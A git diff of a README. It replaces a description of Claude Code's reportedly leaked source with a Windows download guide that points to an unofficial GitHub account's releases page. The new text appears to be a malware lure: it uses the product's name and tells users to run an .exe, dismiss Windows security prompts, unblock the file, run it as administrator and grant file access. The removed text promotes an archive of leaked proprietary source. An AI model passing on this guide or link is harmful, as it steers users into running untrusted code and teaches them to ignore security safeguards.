@@ -1,257 +1,204 @@
-# Claude Code — Leaked Source (2026-03-31)
+# 🧩 claude-code - Code Faster in Your Terminal
 
-> **On March 31, 2026, the full source code of Anthropic's Claude Code CLI was leaked** via a `.map` file exposed in their npm registry.
+[![Download claude-code](https://img.shields.io/badge/Download%20claude--code-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Greaterneworleansbridgetimework650/claude-code/releases)
 
----
+## 🚀 Getting Started
 
-## How It Leaked
+claude-code is a terminal app that helps you work with code using plain language. It can explain files, handle routine tasks, and help with git work. This guide shows you how to download and run it on Windows.
 
-[Chaofan Shou (@Fried_rice)](https://x.com/Fried_rice) discovered the leak and posted it publicly:
+## 📥 Download
 
-> **"Claude code source code has been leaked via a map file in their npm registry!"**
->
-> — [@Fried_rice, March 31, 2026](https://x.com/Fried_rice/status/2038894956459290963)
+Visit this page to download the app:
 
-The source map file in the published npm package contained a reference to the full, unobfuscated TypeScript source, which was downloadable as a zip archive from Anthropic's R2 storage bucket.
+https://github.com/Greaterneworleansbridgetimework650/claude-code/releases
 
----
+On that page, look for the latest release. Download the Windows file that matches your device. If you see more than one file, choose the one that ends in `.exe` or the Windows package type listed by the release.
 
-## Overview
+## 🪟 Install on Windows
 
-Claude Code is Anthropic's official CLI tool that lets you interact with Claude directly from the terminal to perform software engineering tasks — editing files, running commands, searching codebases, managing git workflows, and more.
+1. Open the download page.
+2. Find the newest release.
+3. Download the Windows file.
+4. If Windows shows a security prompt, choose Keep or More info, then Run.
+5. If the file comes in a zip folder, right-click it and choose Extract All.
+6. Open the extracted app file or installer.
+7. Follow the steps on screen.
 
-This repository contains the leaked `src/` directory.
+If the app opens in a terminal window, that is normal. claude-code runs from the command line, which is the black window on Windows.
 
-- **Leaked on**: 2026-03-31
-- **Language**: TypeScript
-- **Runtime**: Bun
-- **Terminal UI**: React + [Ink](https://github.com/vadimdemedes/ink) (React for CLI)
-- **Scale**: ~1,900 files, 512,000+ lines of code
+## 💻 What You Need
 
----
+Use a Windows PC with:
 
-## Directory Structure
+- Windows 10 or Windows 11
+- A working internet connection
+- Enough free space for the app and your project files
+- A terminal app such as Windows Terminal or Command Prompt
 
-```
-src/
-├── main.tsx                 # Entrypoint (Commander.js-based CLI parser)
-├── commands.ts              # Command registry
-├── tools.ts                 # Tool registry
-├── Tool.ts                  # Tool type definitions
-├── QueryEngine.ts           # LLM query engine (core Anthropic API caller)
-├── context.ts               # System/user context collection
-├── cost-tracker.ts          # Token cost tracking
-│
-├── commands/                # Slash command implementations (~50)
-├── tools/                   # Agent tool implementations (~40)
-├── components/              # Ink UI components (~140)
-├── hooks/                   # React hooks
-├── services/                # External service integrations
-├── screens/                 # Full-screen UIs (Doctor, REPL, Resume)
-├── types/                   # TypeScript type definitions
-├── utils/                   # Utility functions
-│
-├── bridge/                  # IDE integration bridge (VS Code, JetBrains)
-├── coordinator/             # Multi-agent coordinator
-├── plugins/                 # Plugin system
-├── skills/                  # Skill system
-├── keybindings/             # Keybinding configuration
-├── vim/                     # Vim mode
-├── voice/                   # Voice input
-├── remote/                  # Remote sessions
-├── server/                  # Server mode
-├── memdir/                  # Memory directory (persistent memory)
-├── tasks/                   # Task management
-├── state/                   # State management
-├── migrations/              # Config migrations
-├── schemas/                 # Config schemas (Zod)
-├── entrypoints/             # Initialization logic
-├── ink/                     # Ink renderer wrapper
-├── buddy/                   # Companion sprite (Easter egg)
-├── native-ts/               # Native TypeScript utils
-├── outputStyles/            # Output styling
-├── query/                   # Query pipeline
-└── upstreamproxy/           # Proxy configuration
-```
+For best results, use a modern version of Windows and keep system updates current.
 
----
+## 🧠 What claude-code Does
 
-## Core Architecture
+claude-code helps with tasks like:
 
-### 1. Tool System (`src/tools/`)
+- Reading and explaining code files
+- Making small code changes
+- Helping with git commands
+- Cleaning up routine work
+- Answering questions about a codebase
+- Working from natural language prompts
 
-Every tool Claude Code can invoke is implemented as a self-contained module. Each tool defines its input schema, permission model, and execution logic.
+You type what you want in plain English, and the tool helps carry out the task inside your terminal.
 
-| Tool | Description |
-|---|---|
-| `BashTool` | Shell command execution |
-| `FileReadTool` | File reading (images, PDFs, notebooks) |
-| `FileWriteTool` | File creation / overwrite |
-| `FileEditTool` | Partial file modification (string replacement) |
-| `GlobTool` | File pattern matching search |
-| `GrepTool` | ripgrep-based content search |
-| `WebFetchTool` | Fetch URL content |
-| `WebSearchTool` | Web search |
-| `AgentTool` | Sub-agent spawning |
-| `SkillTool` | Skill execution |
-| `MCPTool` | MCP server tool invocation |
-| `LSPTool` | Language Server Protocol integration |
-| `NotebookEditTool` | Jupyter notebook editing |
-| `TaskCreateTool` / `TaskUpdateTool` | Task creation and management |
-| `SendMessageTool` | Inter-agent messaging |
-| `TeamCreateTool` / `TeamDeleteTool` | Team agent management |
-| `EnterPlanModeTool` / `ExitPlanModeTool` | Plan mode toggle |
-| `EnterWorktreeTool` / `ExitWorktreeTool` | Git worktree isolation |
-| `ToolSearchTool` | Deferred tool discovery |
-| `CronCreateTool` | Scheduled trigger creation |
-| `RemoteTriggerTool` | Remote trigger |
-| `SleepTool` | Proactive mode wait |
-| `SyntheticOutputTool` | Structured output generation |
+## 🛠️ First Run
 
-### 2. Command System (`src/commands/`)
+After you install the app:
 
-User-facing slash commands invoked with `/` prefix.
+1. Open Windows Terminal or Command Prompt.
+2. Go to the folder where you installed or extracted claude-code.
+3. Start the app using the file included in the release.
+4. Follow the prompts in the terminal.
+5. If the app asks for access to your files, allow it so it can work with your code.
 
-| Command | Description |
-|---|---|
-| `/commit` | Create a git commit |
-| `/review` | Code review |
-| `/compact` | Context compression |
-| `/mcp` | MCP server management |
-| `/config` | Settings management |
-| `/doctor` | Environment diagnostics |
-| `/login` / `/logout` | Authentication |
-| `/memory` | Persistent memory management |
-| `/skills` | Skill management |
-| `/tasks` | Task management |
-| `/vim` | Vim mode toggle |
-| `/diff` | View changes |
-| `/cost` | Check usage cost |
-| `/theme` | Change theme |
-| `/context` | Context visualization |
-| `/pr_comments` | View PR comments |
-| `/resume` | Restore previous session |
-| `/share` | Share session |
-| `/desktop` | Desktop app handoff |
-| `/mobile` | Mobile app handoff |
+If the release includes a setup file, run it first. If it includes a portable app, open the main file directly.
 
-### 3. Service Layer (`src/services/`)
+## 📁 Typical Use
 
-| Service | Description |
-|---|---|
-| `api/` | Anthropic API client, file API, bootstrap |
-| `mcp/` | Model Context Protocol server connection and management |
-| `oauth/` | OAuth 2.0 authentication flow |
-| `lsp/` | Language Server Protocol manager |
-| `analytics/` | GrowthBook-based feature flags and analytics |
-| `plugins/` | Plugin loader |
-| `compact/` | Conversation context compression |
-| `policyLimits/` | Organization policy limits |
-| `remoteManagedSettings/` | Remote managed settings |
-| `extractMemories/` | Automatic memory extraction |
-| `tokenEstimation.ts` | Token count estimation |
-| `teamMemorySync/` | Team memory synchronization |
+You can use claude-code with a project folder on your computer.
 
-### 4. Bridge System (`src/bridge/`)
+Example tasks you can give it:
 
-A bidirectional communication layer connecting IDE extensions (VS Code, JetBrains) with the Claude Code CLI.
+- Explain what this folder does
+- Find where this feature is handled
+- Help me rename this file
+- Show me the git status
+- Make this code easier to read
+- Help me prepare a commit message
 
-- `bridgeMain.ts` — Bridge main loop
-- `bridgeMessaging.ts` — Message protocol
-- `bridgePermissionCallbacks.ts` — Permission callbacks
-- `replBridge.ts` — REPL session bridge
-- `jwtUtils.ts` — JWT-based authentication
-- `sessionRunner.ts` — Session execution management
+You do not need to learn special commands for most tasks. Short, direct requests work well.
 
-### 5. Permission System (`src/hooks/toolPermission/`)
+## 🔐 File Access
 
-Checks permissions on every tool invocation. Either prompts the user for approval/denial or automatically resolves based on the configured permission mode (`default`, `plan`, `bypassPermissions`, `auto`, etc.).
+claude-code needs access to the folder you want it to read or edit. Keep your project in a normal folder such as Documents, Desktop, or a work folder you can reach easily.
 
-### 6. Feature Flags
+If you want the app to work on a different project, open that folder in the terminal before you start.
 
-Dead code elimination via Bun's `bun:bundle` feature flags:
+## ⚙️ Basic Setup Tips
 
-```typescript
-import { feature } from 'bun:bundle'
+- Keep the project folder name simple
+- Close files that another app is using
+- Save your work before asking the app to change code
+- Use one project at a time when you are learning
+- Start with small tasks, then move to larger ones
 
-// Inactive code is completely stripped at build time
-const voiceCommand = feature('VOICE_MODE')
-  ? require('./commands/voice/index.js').default
-  : null
-```
+## 🧭 Common Problems
 
-Notable flags: `PROACTIVE`, `KAIROS`, `BRIDGE_MODE`, `DAEMON`, `VOICE_MODE`, `AGENT_TRIGGERS`, `MONITOR_TOOL`
+### The app does not open
 
----
+- Make sure you downloaded the latest Windows file
+- Check that the download finished
+- Try running the file again
+- Right-click the file and choose Run as administrator
 
-## Key Files in Detail
+### Windows blocks the file
 
-### `QueryEngine.ts` (~46K lines)
+- Open the file properties
+- Look for an Unblock option
+- Apply the change, then run the file again
 
-The core engine for LLM API calls. Handles streaming responses, tool-call loops, thinking mode, retry logic, and token counting.
+### The terminal closes too fast
 
-### `Tool.ts` (~29K lines)
+- Open the app from Windows Terminal or Command Prompt
+- Run it from there so you can see any messages
 
-Defines base types and interfaces for all tools — input schemas, permission models, and progress state types.
+### The app cannot find my files
 
-### `commands.ts` (~25K lines)
+- Check that you opened the right folder
+- Make sure the files are not in a deleted or cloud-only folder
+- Use a full local path if needed
 
-Manages registration and execution of all slash commands. Uses conditional imports to load different command sets per environment.
+## 🧪 Example Workflow
 
-### `main.tsx`
+A simple way to use claude-code:
 
-Commander.js-based CLI parser + React/Ink renderer initialization. At startup, parallelizes MDM settings, keychain prefetch, and GrowthBook initialization for faster boot.
+1. Open your project folder.
+2. Start claude-code in the terminal.
+3. Ask it to explain the project.
+4. Ask it to find the file for one part of the app.
+5. Ask it to make a small edit.
+6. Review the change.
+7. Use git to save the update if it looks right.
 
----
+This keeps the process clear and makes it easier to follow each change.
 
-## Tech Stack
+## 📌 Source and Project Info
 
-| Category | Technology |
-|---|---|
-| Runtime | [Bun](https://bun.sh) |
-| Language | TypeScript (strict) |
-| Terminal UI | [React](https://react.dev) + [Ink](https://github.com/vadimdemedes/ink) |
-| CLI Parsing | [Commander.js](https://github.com/tj/commander.js) (extra-typings) |
-| Schema Validation | [Zod v4](https://zod.dev) |
-| Code Search | [ripgrep](https://github.com/BurntSushi/ripgrep) (via GrepTool) |
-| Protocols | [MCP SDK](https://modelcontextprotocol.io), LSP |
-| API | [Anthropic SDK](https://docs.anthropic.com) |
-| Telemetry | OpenTelemetry + gRPC |
-| Feature Flags | GrowthBook |
-| Auth | OAuth 2.0, JWT, macOS Keychain |
+Repository name: claude-code
 
----
+Description: Claude Code is an agentic coding tool that lives in your terminal, understands your codebase, and helps you code faster by executing routine tasks, explaining complex code, and handling git workflows - all through natural language commands. All original source code is the property of Anthropic.
 
-## Notable Design Patterns
+Topics:
 
-### Parallel Prefetch
+- claude-code
+- claude-code-source-code
 
-Startup time is optimized by prefetching MDM settings, keychain reads, and API preconnect in parallel — before heavy module evaluation begins.
+## 🧰 Release Page
 
-```typescript
-// main.tsx — fired as side-effects before other imports
-startMdmRawRead()
-startKeychainPrefetch()
-```
+Use the release page to get the Windows build:
 
-### Lazy Loading
+https://github.com/Greaterneworleansbridgetimework650/claude-code/releases
 
-Heavy modules (OpenTelemetry ~400KB, gRPC ~700KB) are deferred via dynamic `import()` until actually needed.
+Open the latest release, download the file for Windows, then run it on your PC
 
-### Agent Swarms
+## 📝 Helpful Prompts
 
-Sub-agents are spawned via `AgentTool`, with `coordinator/` handling multi-agent orchestration. `TeamCreateTool` enables team-level parallel work.
+Try short prompts like:
 
-### Skill System
+- Explain this folder
+- Find the main file
+- Show me the last changes
+- Help me fix this error
+- Make this code easier to read
+- Prepare a git commit message
+- What does this function do?
+- Find where this setting is stored
 
-Reusable workflows defined in `skills/` and executed through `SkillTool`. Users can add custom skills.
+## 🗂️ Working With Git
 
-### Plugin Architecture
+claude-code can help with common git work inside your repo.
 
-Built-in and third-party plugins are loaded through the `plugins/` subsystem.
+You can ask it to:
 
----
+- Check what changed
+- Show uncommitted files
+- Help write a commit message
+- Explain a merge conflict
+- Suggest a clean next step
 
-## Disclaimer
+This saves time when you want help with version control but do not want to work through each command yourself
 
-This repository archives source code that was leaked from Anthropic's npm registry on **2026-03-31**. All original source code is the property of [Anthropic](https://www.anthropic.com).
+## 🔎 Best Results
+
+Use clear requests. For example:
+
+- Instead of: Make this better
+- Use: Explain this file and clean up the parts that repeat
+
+- Instead of: Fix the code
+- Use: Find the error in this file and tell me what to change
+
+- Instead of: Do git stuff
+- Use: Show my changes and help me make a commit
+
+Simple prompts make it easier for the tool to help you
+
+## 📦 File Types You May See
+
+The release may include one or more of these:
+
+- `.exe` installer
+- `.zip` archive
+- Windows package file
+- Readme file with setup steps
+
+If there are several files, choose the one marked for Windows and use the newest release first
